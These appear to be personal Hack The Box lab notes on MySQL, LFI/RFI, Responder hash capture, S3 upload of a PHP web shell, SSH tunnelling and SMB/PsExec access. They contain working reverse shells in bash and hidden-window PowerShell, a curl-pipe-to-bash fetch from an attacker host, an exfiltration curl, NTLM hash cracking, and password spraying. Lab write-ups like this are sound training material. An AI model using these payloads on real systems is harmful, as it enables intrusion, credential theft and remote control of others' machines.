# Miscellaneous 2

## MySQL

- It is essential to test for passwordless authentication. An initial attempt can be to attempt a log-in as the root user, having the highest level of privileges on the system:

```
mysql -h <target.ip> -u root
```

- Prints out the databases we can access:

```
SHOW databases;
```

- Set to use the database named {database_name}:

```
USE {database_name};
```

- Prints out the available tables inside the current database:

```
SHOW tables;
```

- Prints out all the data from the table {table_name}:

```
SELECT * FROM {table_name};
```

Note: *it is essential to end each command with the ```;``` symbol, as it declares the end of the command.*

## LFI & RFI

Note: *this section has been borrowed from the official HTP Responder write-up.*

LFI or Local File Inclusion occurs when an attacker is able to get a website to include a file that was not intended to be an option for this application. A common example is when an application uses the path to a file as input. If the application treats this input as trusted, and the required sanitary checks are not performed on this input, then the attacker can exploit it by using the ```../``` string in the inputted file name and eventually view sensitive files in the local file system. In some limited cases, an LFI can lead to code execution as well.

One of the most common files that a penetration tester might attempt to access on a Windows machine to verify LFI is the hosts file located in ```WINDOWS\System32\drivers\etc\hosts```.

Example:

```
http://unika.htb/index.php?page=../../../../../../../../windows/system32/drivers/etc/hosts
```

RFI or Remote File Inclusion is similar to LFI but in this case it is possible for an attacker to load a remote file on the host using protocols like HTTP, FTP etc.

Example:

```
//10.10.14.6/somefile
```

## Responder

The startup for HTB:

```
sudo responder -I tun0
```

With the Responder server ready, we tell the server to include a resource from our SMB server by setting the ```page``` parameter as follows via the web browser:

```
http://unika.htb/?page=//10.10.14.25/somefile
```

Note: *In this case, because we have the freedom to specify the address for the SMB share, we specify the IP address of our attacking machine.*

On checking our listening Responder server we can see we have a NetNTLMv for the Administrator user.

We can dump the hash into a file and attempt to crack it with john , which is a password hash-cracking
utility.

```
echo "Administrator::RESPONDER:f99ba5679a3a19b2:3D4AC2BCF6C2A9287AC437BF840FC53F:010100000000000080B824F035FADA0115426E8ED92A7D730000000002000800410049003700410001001E00570049004E002D00390037004F0047005100540032004F004E0032004A0004003400570049004E002D00390037004F0047005100540032004F004E0032004A002E0041004900370041002E004C004F00430041004C000300140041004900370041002E004C004F00430041004C000500140041004900370041002E004C004F00430041004C000700080080B824F035FADA01060004000200000008003000300000000000000001000000002000003281833ED22A99967FF31D43FEC15BE4F4BC0B26E003D4646930AAEB67C45FE90A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310035002E00350038000000000000000000" > hash.txt
```

We pass the hash file to john and crack the password for the Administrator account.

```
john -w=/usr/share/wordlists/rockyou.txt hash.txt
```

We'll connect to the WinRM service on the target and try to get a session:

```
evil-winrm -i 10.129.126.229 -u administrator -p badminton
```

## Gobuster subdomain enumeration

```
gobuster vhost -w /home/lea/Documents/SecLists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain -u http://thetoppers.htb
```

Note: *if using Gobuster version 3.2.0 and above we also have to add the ```--append-domain``` flag to our command.*

## awscli and PHP reverse shell (as seen on HTB)

After the installation run the following command:

```
awscli utility
```

Note: *We will be using an arbitrary value ```temp``` for all the fields, as sometimes the server is configured to not check authentication (still, it must be configured to something for aws to work).*

We can list all of the S3 buckets hosted by the server by using the ls command:

```
aws --endpoint=http://s3.thetoppers.htb s3 ls
```

We can also use the ls command to list objects and common prefixes under the specified bucket:

```
aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb
```

Awscli has got another feature that allows us to copy files to a remote bucket. We already know that the website is using PHP. Thus, we can try uploading a PHP shell file to the S3 bucket and since it's uploaded to the webroot directory we can visit this webpage in the browser, which will, in turn, execute this file and we will achieve remote code execution.

We can use the following PHP one-liner which uses the ```system()``` function which takes the URL parameter ```cmd``` as an input and executes it as a system command:

```
<?php system($_GET["cmd"]); ?>
```

Dissection:

- ```<?php ... ?>```

This is the PHP opening ```(<?php)``` and closing ```(?>)``` tag. Everything between these tags is interpreted as PHP code. The closing tag is optional and can be omitted in some configurations, especially for scripts that are intended to be included or require no HTML.

- ```system(...)```

This is a PHP built-in function that executes a command via the system's shell. It passes the command to the operating system for execution and, by default, returns the output of the command. If you provide a second argument (a variable), it will also capture the output of the command.

- ```$_GET["cmd"]```

This is a PHP superglobal array that contains all the data sent via HTTP GET method. Specifically, ```$_GET["cmd"]``` retrieves the value associated with the cmd parameter from the URL. For example, if you access ```http://example.com/shell.php?cmd=ls```, ```$_GET["cmd"]``` would be ```"ls"```.

Next, let's create a PHP file to upload:

```
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

Then, we can upload this PHP shell to the thetoppers.htb S3 bucket using the following command:

```
aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb
```

We can confirm that our shell is uploaded by navigating to ```http://thetoppers.htb/shell.php```. Let us try executing the OS command id using the URL parameter ```cmd```:

```
http://thetoppers.htb/shell.php?cmd=id
```

The response from the server contains the output of the OS command ```id``` , which verified that we have code execution on the box. Thus, let us now try to obtain a reverse shell.

Through a reverse shell, we will trigger the remote host to connect back to our local machine's IP address on the specified listening port. We can obtain the tun0 IP address of our local machine using the ```ifconfig``` command.

Let's get a reverse shell by creating a new file ```shell.sh``` containing the following bash reverse shell payload which will connect back to our local machine on port 1337:

```
#!/bin/bash
bash -i >& /dev/tcp/YOUR_IP_ADDRESS/1337 0>&1
```

Dissection:

- ```bash -i``` starts an interactive Bash shell.

- ```>& /dev/tcp/YOUR_IP_ADDRESS/1337``` redirects the shell’s output and errors to a TCP connection established to YOUR_IP_ADDRESS on port 1337.

- ```0>&1``` redirects the shell’s input to the same network connection, allowing for two-way communication.

We will start a ```ncat``` listener on our local port 1337 using the following command:

```
nc -nvlp 1337
```

Note: *the options ```-nvlp``` are a combination of flags that modify Netcat behavior:*

- ```-n```: Tells nc to use numeric-only IP addresses (i.e., don't try to resolve hostnames).

- ```-v```: Enables verbose mode, giving more detailed output about what nc is doing.

- ```-l```: Puts nc into listening mode, which means it will wait for incoming connections.

- ```-p```: Specifies the port on which nc will listen. In this case, it's port 1337.

Note: *Sometimes netcat can be finicky. You might want to try using ncat (from the Nmap suite). For example:*

```
ncat -lvnp 1337
```

Let's start a web server on our local machine on port 8000 and host this bash file:

```
python3 -m http.server 8000
```

Note: *It is crucial to note here that this command for hosting the web server must be run from the directory which contains the reverse shell file.*

We can use the ```curl``` utility to fetch the bash reverse shell file from our local host and then pipe it to bash in order to execute it. Thus, let us visit the following URL containing the payload in the browser:

```
http://thetoppers.htb/shell.php?cmd=curl%20<YOUR_IP_ADDRESS>:8000/shell.sh|bash
```

Example: ```http://thetoppers.htb/shell.php?cmd=curl%2010.10.15.58:8000/shell.sh|bash```

Note: *```curl``` is a command-line tool used to transfer data to or from a server. It supports various protocols like HTTP, HTTPS, FTP, and more, making it handy for tasks like downloading files, testing APIs, or sending HTTP requests.*

After this we receive a reverse shell on the corresponding listening port. The flag can be found at ```/var/www/flag.txt```:

```
cat /var/www/flag.txt
```

## Dealing with Non-Interactive Shells (netcat, ncat)

In the example above, I encountered some trouble getting an interactive shell, which made locating the "flag.txt" file a bit challenging. To address this, I used the following approach:

First, I issued the following command (on my ncat listener) to search the entire system for "flag.txt" and redirected the output to a file in the ```/tmp/``` directory:

```
find / -name flag.txt > /tmp/search_results.txt 2>/dev/null
```

Note: *```2>/dev/null``` redirects any errors (like permission denied messages) to ```/dev/null```, effectively silencing them.*

Next, I used a GET request to include the data from ```search_results.txt``` directly in the URL. For example:

```
curl "http://10.10.15.58:8000/?$(cat /tmp/search_results.txt)"
```

Note: *This command reads the contents of search_results.txt and appends it as a query string to the URL since I'm using a simple HTTP server that only supports GET requests.*

In the terminal where my simple HTTP server was running, I received this crucial piece of information:

```
10.129.137.184 - - [31/Aug/2024 15:49:27] "GET /?/var/www/flag.txt HTTP/1.1" 200 -
```

In conclusion, the flag.txt file was located in ```/var/www/flag.txt```.

## Virtual hosting (HTB box *Ignition*)

In a pentesting or reconnaissance scenario, ```curl -v``` helps you see how a server responds to requests, what headers it uses, and any other subtle details that might be of interest. For example:

```
curl -v http://10.129.1.27
```

- ```-v```: This flag stands for "verbose." It tells curl to provide detailed information about the request and response, including all headers sent by curl and all headers received from the server.

The next step:

```
echo "10.129.1.27 ignition.htb" | sudo tee -a /etc/hosts
```

Notes:

- ```tee```: This command reads from standard input and writes to standard output and one or more files simultaneously.

- ```-a```: This flag tells ```tee``` to append the output to the specified file (in this case, ```/etc/hosts```). If you don't use ```-a```, ```tee``` would overwrite the file instead of appending to it.

The official write-up says: *Once this configuration is complete, we can proceed to reload the target's webpage and verify if it loads successfully. Since the requested hostname now has an association in your hosts file, the website can load without issue. From here, we can start working towards gaining a foothold. (...) The only option of exploring the website further is using gobuster.*

```
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u http://ignition.htb
```

One possible entry point discovered by gobuster is ```http://ignition.htb/admin```

Upon accessing this URL, a Magento login screen is presented to us. As the official write-up says, we will attempt some default credentials for the Magento service, since there is no other basis upon which we can rely. For example, we can attempt to use the most common passwords of the year 2021 as well as a common username, such as admin:

```
admin admin123
admin root123
admin password1
admin administrator1
admin changeme1
admin password123
admin qwerty123
admin administrator123
admin changeme123
```

After manually attempting a number of these credentials, we land on a successful login and this concludes the current example.

## Password Spraying and SSL Socket Statistics

The password spraying technique involves circumventing common countermeasures against brute-force attacks, such as the locking of the account due to too many attempts, as the same password is sprayed across many users before another password is attempted.

In order to conduct our attack, we need to create a list of usernames to try the password against.

For example, we can task ```Hydra``` with executing the attack on the target machine. Using the ```-L``` option, we specify which file contains the list of usernames we will use for the attack. The ```-p``` option specifies that we only want to use one password, instead of a password list. After the target IP address, we specify the protocol for the attack, which in this case is SSH.

```
hydra -L usernames.txt -p 'funnel123#!#' {target_IP} ssh
```

After just a few seconds hydra gets a valid hit on the combination ```christine:funnel123#!#```. We can now use these credentials to gain remote access to the machine using this command: ```ssh christine@<target.ip>```.

From this point on, we have complete access as the "christine" user on the target machine, and can start enumerating it for potential files or services that we can explore further. A crucial command at this point in time is the ```ss``` command, which stands for socket statistics, and can be used to check which ports are listening locally on a given machine.

```
ss -tln
```

- ```-l```: Display only listening sockets.

- ```-t```: Display TCP sockets.

- ```-n```: Do not try to resolve service names.

The output reveals a handful of information:

The first column indicates the ```state``` that the socket is in; since we specified the ```-l``` flag, we will only see sockets that are actively listening for a connection. Moving along horizontally, the ```Recv-Q``` column is not of much concern at this point, it simply displays the number of queued received packets for that given port; ```Send-Q``` does the same but for the amount of sent packets.

The crucial column is the fourth, which displays the local address on which a service listens, as well as its port. 127.0.0.1 is synonymous with localhost , and essentially means that the specified port is only listening locally on the machine and cannot be accessed externally. This also explains why we did not discover such ports in our initial Nmap scan. On the other hand, the addresses ```0.0.0.0```, ```*```,and ```[::]``` indicate that a port is listening on all intefaces, meaning that it is accessible externally, as well as
locally, which is why we were able to detect both the FTP service on port 21 , as well as the SSH service on port 22.

Among these open ports, one particularly sticks out, namely port 5432. Running ss again without the ```-n``` flag will show the default service that is presumably running on the respective port (postgresql). The service which most likely has the flag is hidden locally on the target machine, and the tool to access that service is not installed. While there are some potential workarounds involving uploading static binaries onto the target machine, an easier way to bypass this roadblock is by a practice called port-forwarding, or
tunneling, using SSH.

## Local Port Forwarding with SSH and PostgreSQL interaction

To use local port forwarding with SSH, you can use the ```ssh``` command with the ```-L``` option, followed by the local port, remote host and port, and the remote SSH server. For example, the following command will forward traffic from the local port 1234 to the remote server remote.example.com 's localhost interface on port 22:

```
ssh -L 1234:localhost:22 user@remote.example.com
```

In the scenario we are currently facing, we want to forward traffic from any given local port, for instance 1234, to the port on which PostgreSQL is listening, namely 5432, on the remote server. We therefore specify port 1234 to the left of localhost, and 5432 to the right, indicating the target port.

```
ssh -L 1234:localhost:5432 christine@{target_IP}
```

Note: *we may elect to just establish a tunnel to the target, without actually opening a full-on
shell on the target system. To do so, we can use the ```-f``` and ```-N``` flags which:*

- *send the command to the shell's background right before executing it remotely*

- *tells SSH not to execute any commands remotely.*

Using this command above SSH has opened up a socket on our local machine on port 1234, to which we can now direct traffic that we want forwarded to port 5432 on the target machine. We can see this new socket by running ss again, but this time on our local machine, using a different shell than the one we used to establish the tunnel.

```
ss -tlpn
```

Using our installation of psql, we can now interact with the PostgreSQL service running locally on the target machine. We make sure to specify localhost using the ```-h``` option, as we are targeting the tunnel we created earlier with SSH, as well as port 1234 with the ```-p``` option, which is the port the tunnel is listening on.

```
psql -U christine -h localhost -p 1234
```

In order to list the existing databases, we can execute the ```\l``` command, short for ```\list```.

```
\l
```

Five rows are returned, including a database with the ominous name secrets. Using the ```\c``` command, short for ```\connect```, we can select a database and proceed to interact with its tables.

```
\c secrets
```

Finally, we can list the database's tables using the ```\dt``` command, and dump its contents using the conventional SQL SELECT query.

```
\dt
SELECT * FROM flag;
```

This example can now be concluded.

## More on SMB, PsExec and Powershell Reverse Shell

Note: the standard root flag location on any Hack The Box Windows vulnerable machine is ```C:\Users\Administrator\Desktop```.

Useful switches:

```
-L : List available shares on the target.
-U : Login identity to use.
```

Typically, the SMB server will request a password, but since we want to cover all aspects of possible misconfigurations, we can attempt a passwordless login. Simply hitting the Enter key when prompted for the Administrator password will send a blank input to the server.

```
smbclient -L <target.ip> -U Administrator
```

For example, we could access the C$ share, which is the file system of the Windows machine:

```
smbclient \\\\10.129.93.6\\C$ -U Administrator
```

In order to retrieve the flag.txt file from the server, we can use the ```get flag.txt``` command. This will initialize a download with the output location being our last visited directory on our attacker VM at the point of running the smbclient tool.

Note: the official write-up states this as Option B: *We managed to get the SMB command-line interactive interface. However, since we can access this ```ADMIN$``` share, we will try to use a tool called psexec.py to exploit this misconfiguration & get the interactive system shell. The psexec.py is part of the Impacket framework.*

*PsExec is a portable tool from Microsoft that lets you run processes remotely using any user's credentials. It’s a bit like a remote access program but instead of controlling the computer with a mouse, commands are sent via Command Prompt, without having to manually install client software.*

*Impacket creates a remote service by uploading a randomly-named executable on the ```ADMIN$``` share on the remote system and then register it as a Windows service. This will result in having an interactive shell available on the remote Windows system via TCP port 445. Psexec requires credentials for a user with local administrator privileges or higher since reading/writing to the ```ADMIN$``` share is required. Once you successfully authenticate, it will drop you into a ```NT AUTHORITY\SYSTEM shell.```*

The command we are going to run is:

```
psexec.py administrator@10.129.93.6
```

*Now, we can browse the file system and retrieve the flag. However, using the psexec utility is often preferred in simulated testing environments, but it can be easily detected by the Windows Defender in real-world assessments.*

As we can see, psexec is far from stealthy. For this reason, I prefer connecting to a machine using wmiexec, and then executing a PowerShell payload to establish a reverse shell on my ncat listener.

First I establish the connection like this:

```
impacket-wmiexec Administrator@10.129.93.6
```

Next, I set up my listener:

```
ncat -lvnp 8000
```

Then I use the following payload in the terminal where wmiexec is running (I have tested this payload and it should work well):

```
powershell.exe -NoP -sta -NonI -W Hidden -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.210',8000);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

Breakdown of the Flags:

- ```-NoP```: No profile loading. Ensures no user profile scripts are run.

- ```-sta```: Runs PowerShell in single-threaded apartment mode.

- ```-NonI```: Non-interactive mode. Suppresses interactive prompts.

- ```-W Hidden```: Hides the PowerShell window.

- ```-c```: Executes the command specified in the quotes.

Breakdown of the Payload:

- ```New-Object System.Net.Sockets.TCPClient('10.10.14.210',8000);```

Creates a TCP client object that connects to the specified IP address and port.

- ```$stream = $client.GetStream();```

Retrieves the network stream for reading from and writing to the connected TCP client.

- ```[byte[]]$bytes = 0..65535|%{0};```

Initializes a byte array of size 65536 to store data read from the stream.

- ```while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){...}```

Reads data from the stream into the byte array until the stream is closed.

- ```$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);```

Converts the byte array data to a string.

- ```$sendback = (iex $data 2>&1 | Out-String );```

Executes the received command ($data) using Invoke-Expression (aliased as iex) and captures the output.

- ```$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';```

Appends the current directory path and prompt to the command output.

- ```$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);```

Converts the response string to a byte array for sending back through the stream.

- ```$stream.Write($sendbyte,0,$sendbyte.Length);```

Writes the byte array back to the stream.

- ```$client.Close()```

Closes the TCP client connection.

Using this payload, I successfully obtained an interactive reverse shell and retrieved the flag. This example is now concluded.
